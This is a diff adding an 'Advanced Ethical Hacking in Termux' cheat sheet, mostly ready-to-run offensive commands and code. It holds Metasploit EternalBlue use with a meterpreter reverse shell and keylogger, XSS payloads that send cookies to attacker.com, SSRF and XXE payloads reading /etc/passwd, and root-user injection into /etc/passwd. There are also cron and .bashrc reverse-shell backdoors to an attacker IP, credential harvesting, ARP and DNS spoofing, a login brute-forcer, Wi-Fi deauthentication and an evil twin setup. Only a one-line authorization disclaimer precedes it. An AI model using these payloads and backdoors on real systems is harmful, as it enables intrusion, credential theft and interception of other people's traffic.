@@ -1,0 +1,560 @@
+Advanced Ethical Hacking in Termux
+=====================================
+
+STRICTLY FOR: Authorized penetration testing, CTF competitions,
+security research on YOUR OWN systems only.
+
+
+========================================
+PHASE 1: ADVANCED RECONNAISSANCE
+========================================
+
+PASSIVE RECON (no direct contact with target)
+----------------------------------------------
+
+    # OSINT - Open Source Intelligence
+    pip install theHarvester
+    theHarvester -d example.com -b google,bing,linkedin
+
+    # Shodan CLI (scan internet-exposed devices)
+    pip install shodan
+    shodan init YOUR_API_KEY
+    shodan search "apache 2.4" country:US
+    shodan host 8.8.8.8
+
+    # Google Dorking (manual via browser):
+    site:example.com filetype:pdf
+    site:example.com inurl:admin
+    site:example.com intitle:"index of"
+    "example.com" ext:sql OR ext:db OR ext:bak
+
+ACTIVE RECON
+-------------
+
+    # Advanced Nmap techniques:
+    nmap -sS <target>                  # SYN stealth scan
+    nmap -sU <target>                  # UDP scan
+    nmap -sN <target>                  # NULL scan (bypasses some firewalls)
+    nmap -sF <target>                  # FIN scan
+    nmap -sX <target>                  # Xmas scan
+    nmap -D RND:10 <target>            # decoy scan (hides real IP)
+    nmap -f <target>                   # fragment packets (IDS evasion)
+    nmap --script=default,safe <target>
+    nmap --script http-enum <target>   # enumerate HTTP directories
+    nmap --script smb-vuln* <target>   # check SMB vulnerabilities
+
+    # Banner grabbing:
+    nc -v target-ip 80
+    HEAD / HTTP/1.0
+
+    # SMTP enumeration:
+    nc target-ip 25
+    VRFY admin
+    EXPN admins
+
+DNS ADVANCED
+-------------
+
+    # Zone transfer (misconfigured DNS servers leak all records):
+    dig axfr @ns1.example.com example.com
+
+    # Brute force subdomains:
+    git clone https://github.com/aboul3la/Sublist3r.git
+    python3 sublist3r.py -d example.com -v -o output.txt
+
+    # Reverse DNS lookup:
+    dig -x 192.168.1.1
+
+    # DNS cache snooping:
+    dig @target-dns example.com A +norecurse
+
+
+========================================
+PHASE 2: VULNERABILITY SCANNING
+========================================
+
+OPENVAS / GREENBONE (vulnerability scanner)
+--------------------------------------------
+
+    pkg install openvas
+    openvas-setup
+    openvas-start
+    # Access via browser at https://localhost:9392
+
+NIKTO ADVANCED
+---------------
+
+    perl nikto.pl -h http://target.com -o report.html -Format htm
+    perl nikto.pl -h http://target.com -ssl             # HTTPS
+    perl nikto.pl -h http://target.com -Tuning 1234     # specific tests
+    perl nikto.pl -h http://target.com -useragent "Mozilla/5.0"
+
+CUSTOM VULNERABILITY SCANNER (Python)
+---------------------------------------
+
+    # Save as vuln_scan.py:
+
+    import socket
+    import requests
+    from concurrent.futures import ThreadPoolExecutor
+
+    def check_port(host, port):
+        try:
+            sock = socket.socket()
+            sock.settimeout(1)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            return port if result == 0 else None
+        except:
+            return None
+
+    def scan_ports(host, start=1, end=1024):
+        open_ports = []
+        with ThreadPoolExecutor(max_workers=100) as executor:
+            results = executor.map(lambda p: check_port(host, p),
+                                   range(start, end+1))
+            open_ports = [p for p in results if p]
+        return open_ports
+
+    target = input("Target IP: ")
+    print(f"Open ports: {scan_ports(target)}")
+
+
+========================================
+PHASE 3: EXPLOITATION
+========================================
+
+METASPLOIT ADVANCED
+--------------------
+
+    msfconsole
+
+    # Search for exploits:
+    search type:exploit platform:windows
+    search cve:2021-44228              # Log4Shell
+    search ms17-010                    # EternalBlue
+
+    # Use an exploit:
+    use exploit/windows/smb/ms17_010_eternalblue
+    show options
+    set RHOSTS 192.168.1.100
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp
+    set LHOST 192.168.1.50
+    set LPORT 4444
+    run
+
+    # Meterpreter commands (after shell):
+    sysinfo                            # target info
+    getuid                             # current user
+    getsystem                          # try to get SYSTEM
+    hashdump                           # dump password hashes
+    upload file.exe C:\\Users\\         # upload file
+    download C:\\secret.txt             # download file
+    shell                              # drop to OS shell
+    screenshare                        # view screen
+    keyscan_start                      # start keylogger
+    keyscan_dump                       # read keystrokes
+    run post/multi/recon/local_exploit_suggester
+
+CUSTOM EXPLOIT DEVELOPMENT
+----------------------------
+
+    pip install pwntools
+
+    # Buffer overflow template (for CTF/practice):
+
+    from pwn import *
+
+    target = process('./vulnerable_binary')  # local
+    # target = remote('target.com', 4444)   # remote
+
+    # Find offset with cyclic pattern:
+    pattern = cyclic(200)
+    target.sendline(pattern)
+    target.wait()
+    core = target.corefile
+    offset = cyclic_find(core.read(core.rsp, 4))
+    print(f"Offset: {offset}")
+
+    # Build exploit:
+    padding = b"A" * offset
+    ret_addr = p64(0xdeadbeef)          # address to jump to
+    payload = padding + ret_addr
+    target.sendline(payload)
+    target.interactive()
+
+WEB EXPLOITATION ADVANCED
+---------------------------
+
+    # XSS (Cross-Site Scripting) payloads:
+    <script>document.location='http://attacker.com/c?c='+document.cookie</script>
+    <img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
+
+    # SSRF (Server-Side Request Forgery):
+    http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
+    http://target.com/fetch?url=file:///etc/passwd
+
+    # XXE (XML External Entity):
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <root>&xxe;</root>
+
+    # IDOR (Insecure Direct Object Reference):
+    GET /api/user/1001/profile  ->  try /api/user/1000/profile
+    GET /download?file=report.pdf -> try file=../../../etc/passwd
+
+    # JWT Attacks:
+    pip install jwt_tool
+    python3 jwt_tool.py <JWT_TOKEN> -T   # tamper
+    python3 jwt_tool.py <JWT_TOKEN> -X a # algorithm confusion
+
+
+========================================
+PHASE 4: POST-EXPLOITATION
+========================================
+
+PRIVILEGE ESCALATION (Linux)
+------------------------------
+
+    # Find SUID binaries (run as root):
+    find / -perm -4000 -type f 2>/dev/null
+
+    # Writable /etc/passwd:
+    ls -la /etc/passwd
+    openssl passwd -1 hacker123
+    echo "hacker:$hash:0:0::/root:/bin/bash" >> /etc/passwd
+
+    # Sudo misconfigurations:
+    sudo -l                            # what can current user run?
+    sudo vim -c '!bash'                # if vim allowed
+    sudo find /tmp -exec /bin/bash \;  # if find allowed
+
+    # Cron jobs running as root:
+    cat /etc/crontab
+    ls -la /etc/cron.*
+    find / -name "*.sh" -writable 2>/dev/null
+
+    # Kernel exploits:
+    uname -a                           # get kernel version
+    searchsploit linux kernel 5.4      # find exploits
+
+    # LinPEAS (automated privilege escalation check):
+    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+PERSISTENCE MECHANISMS
+-----------------------
+
+    # Cron backdoor:
+    (crontab -l; echo "* * * * * bash -i >& /dev/tcp/attacker-ip/4444 0>&1") | crontab -
+
+    # SSH authorized keys:
+    echo "ssh-ed25519 AAAA...your-key..." >> ~/.ssh/authorized_keys
+
+    # .bashrc backdoor:
+    echo "bash -i >& /dev/tcp/attacker-ip/4444 0>&1" >> ~/.bashrc
+
+LATERAL MOVEMENT
+-----------------
+
+    # Dump credentials from memory (Linux):
+    cat /etc/shadow                    # password hashes (need root)
+    grep -r "password" /etc/ 2>/dev/null
+    find / -name "*.conf" 2>/dev/null | xargs grep -l "password"
+
+    # Pass the hash (if you have NTLM hash):
+    pth-winexe -U 'domain/user%aad3b435:hash' //target-ip cmd.exe
+
+    # SSH tunneling:
+    ssh -L 8080:internal-server:80 user@jump-host    # local tunnel
+    ssh -R 4444:localhost:4444 user@attacker         # reverse tunnel
+    ssh -D 1080 user@jump-host                       # SOCKS proxy
+
+
+========================================
+PHASE 5: ADVANCED NETWORK ATTACKS
+========================================
+
+ARP SPOOFING (MitM on local network)
+--------------------------------------
+
+    pkg install arpspoof
+    # or:
+    pip install scapy
+
+    # Enable IP forwarding:
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+
+    # ARP spoof between victim and gateway:
+    arpspoof -i wlan0 -t 192.168.1.10 192.168.1.1  &
+    arpspoof -i wlan0 -t 192.168.1.1 192.168.1.10  &
+
+    # Capture traffic:
+    tcpdump -i wlan0 -w captured.pcap
+
+SCAPY (custom packet crafting)
+--------------------------------
+
+    pip install scapy
+    scapy
+
+    # Custom TCP SYN packet:
+    from scapy.all import *
+    pkt = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
+    ans, unans = sr(pkt, timeout=2)
+    ans.show()
+
+    # ICMP ping sweep:
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),
+                     timeout=2)
+    for snd, rcv in ans:
+        print(rcv.sprintf(r"%ARP.psrc% is alive"))
+
+DNS SPOOFING
+-------------
+
+    # Using dnsspoof:
+    pkg install dsniff
+    echo "192.168.1.50 *.evil.com" > dns.conf
+    dnsspoof -i wlan0 -f dns.conf
+
+
+========================================
+PHASE 6: PASSWORD ATTACKS (ADVANCED)
+========================================
+
+HASHCAT (GPU-accelerated, use on PC — slow on Android)
+--------------------------------------------------------
+
+    # Hash types:
+    # -m 0    = MD5
+    # -m 100  = SHA1
+    # -m 1800 = sha512crypt (Linux shadow)
+    # -m 1000 = NTLM (Windows)
+
+    hashcat -m 0 hashes.txt wordlist.txt
+    hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule
+    hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a   # brute force 5 chars
+
+JOHN THE RIPPER ADVANCED
+-------------------------
+
+    pkg install john
+
+    # Crack Linux shadow:
+    unshadow /etc/passwd /etc/shadow > combined.txt
+    john combined.txt --wordlist=rockyou.txt
+
+    # Show cracked passwords:
+    john combined.txt --show
+
+    # Crack zip password:
+    zip2john secret.zip > zip.hash
+    john zip.hash --wordlist=rockyou.txt
+
+    # Crack SSH key passphrase:
+    ssh2john id_rsa > id_rsa.hash
+    john id_rsa.hash --wordlist=rockyou.txt
+
+CUSTOM PYTHON BRUTE FORCER
+----------------------------
+
+    import requests
+    from itertools import product
+    import string
+
+    def brute_force_login(url, username, charset, max_len):
+        for length in range(1, max_len + 1):
+            for combo in product(charset, repeat=length):
+                password = ''.join(combo)
+                r = requests.post(url,
+                    data={'username': username, 'password': password},
+                    allow_redirects=False)
+                if r.status_code == 302:  # redirect = success
+                    print(f"[+] Password found: {password}")
+                    return password
+                print(f"[-] Trying: {password}", end='\r')
+        return None
+
+    brute_force_login("http://target.com/login", "admin",
+                      string.ascii_lowercase, 4)
+
+
+========================================
+PHASE 7: WIRELESS SECURITY ADVANCED
+========================================
+
+WPA2 HANDSHAKE CAPTURE
+------------------------
+
+    pkg install aircrack-ng
+
+    # Put adapter in monitor mode:
+    airmon-ng start wlan0
+
+    # Scan for networks:
+    airodump-ng wlan0mon
+
+    # Target a specific AP (capture handshake):
+    airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+
+    # Deauth clients to force reconnect (captures handshake):
+    aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+    # Crack handshake:
+    aircrack-ng handshake-01.cap -w /path/to/wordlist.txt
+
+WPS ATTACK
+-----------
+
+    pkg install reaver
+    reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+
+EVIL TWIN ACCESS POINT
+-----------------------
+
+    pkg install hostapd dnsmasq
+
+    # hostapd.conf:
+    interface=wlan0
+    driver=nl80211
+    ssid=FreeWiFi
+    hw_mode=g
+    channel=6
+
+    # dnsmasq.conf:
+    interface=wlan0
+    dhcp-range=10.0.0.2,10.0.0.254,255.255.255.0,12h
+    dhcp-option=3,10.0.0.1
+    dhcp-option=6,10.0.0.1
+    server=8.8.8.8
+
+
+========================================
+PHASE 8: FORENSICS & ANALYSIS
+========================================
+
+FILE ANALYSIS
+--------------
+
+    pkg install binutils
+    strings suspicious_file             # extract readable strings
+    file suspicious_file                # identify file type
+    xxd suspicious_file | head -20      # hex dump
+    objdump -d binary                   # disassemble binary
+
+MEMORY FORENSICS
+-----------------
+
+    pip install volatility3
+    # Analyze memory dumps:
+    vol -f memory.dmp windows.pslist   # list processes
+    vol -f memory.dmp windows.hashdump # extract password hashes
+    vol -f memory.dmp windows.cmdline  # command line args
+
+STEGANOGRAPHY
+--------------
+
+    pkg install steghide
+    steghide embed -cf image.jpg -sf secret.txt   # hide file
+    steghide extract -sf image.jpg                # extract file
+    steghide info image.jpg                       # check for hidden data
+
+    pkg install imagemagick
+    identify -verbose image.png | grep -i comment
+
+
+========================================
+PHASE 9: SCRIPTING & AUTOMATION
+========================================
+
+AUTOMATED RECON SCRIPT
+------------------------
+
+    #!/usr/bin/env python3
+    # save as recon.py
+
+    import subprocess
+    import sys
+
+    target = sys.argv[1]
+    print(f"[*] Starting recon on {target}")
+
+    # Nmap scan
+    print("[*] Running Nmap...")
+    result = subprocess.run(['nmap', '-sV', '-O', target],
+                            capture_output=True, text=True)
+    print(result.stdout)
+
+    # DNS lookup
+    print("[*] DNS Info...")
+    result = subprocess.run(['dig', target, 'ANY'],
+                            capture_output=True, text=True)
+    print(result.stdout)
+
+    # HTTP headers
+    print("[*] HTTP Headers...")
+    result = subprocess.run(['curl', '-I', f'http://{target}'],
+                            capture_output=True, text=True)
+    print(result.stdout)
+
+    with open(f"{target}_report.txt", "w") as f:
+        f.write(result.stdout)
+    print(f"[+] Report saved to {target}_report.txt")
+
+BASH ONE-LINERS FOR HACKERS
+-----------------------------
+
+    # Scan all ports fast:
+    for port in $(seq 1 65535); do (echo >/dev/tcp/target/$port) 2>/dev/null && echo "Open: $port"; done
+
+    # Extract all IPs from a file:
+    grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' file.txt | sort -u
+
+    # Extract all emails from a file:
+    grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' file.txt
+
+    # Find all web servers in subnet:
+    for ip in 192.168.1.{1..254}; do curl -s --max-time 1 http://$ip && echo "$ip is web server"; done
+
+
+========================================
+CERTIFICATIONS TO PURSUE
+========================================
+
+    CEH   - Certified Ethical Hacker
+    OSCP  - Offensive Security Certified Professional (most respected)
+    eJPT  - eLearnSecurity Junior Penetration Tester (beginner friendly)
+    PNPT  - Practical Network Penetration Tester
+    CompTIA Security+   - Entry level, vendor neutral
+    CompTIA PenTest+    - Penetration testing focused
+
+Recommended Learning Order:
+    1. Networking basics (TCP/IP, OSI model)
+    2. Linux fundamentals
+    3. Python scripting
+    4. TryHackMe beginner paths
+    5. HackTheBox easy machines
+    6. eJPT certification
+    7. OSCP certification
+
+
+========================================
+IMPORTANT TOOLS REFERENCE
+========================================
+
+    Tool            Purpose                     Install
+    -------         -------                     -------
+    nmap            Network scanning            pkg install nmap
+    sqlmap          SQL injection               git clone (github)
+    hydra           Brute forcing               pkg install hydra
+    metasploit      Exploitation framework      pkg install metasploit
+    john            Password cracking           pkg install john
+    aircrack-ng     WiFi security               pkg install aircrack-ng
+    tcpdump         Packet capture              pkg install tcpdump
+    netcat          Networking swiss knife      pkg install netcat-openbsd
+    scapy           Packet crafting             pip install scapy
+    pwntools        CTF/binary exploitation     pip install pwntools
+    theHarvester    OSINT gathering             pip install theHarvester
+    nikto           Web server scanner          pkg install perl + git clone
+    wireshark       GUI packet analysis         Use on PC (not Termux)
+    burpsuite       Web proxy/testing           Use on PC (not Termux)
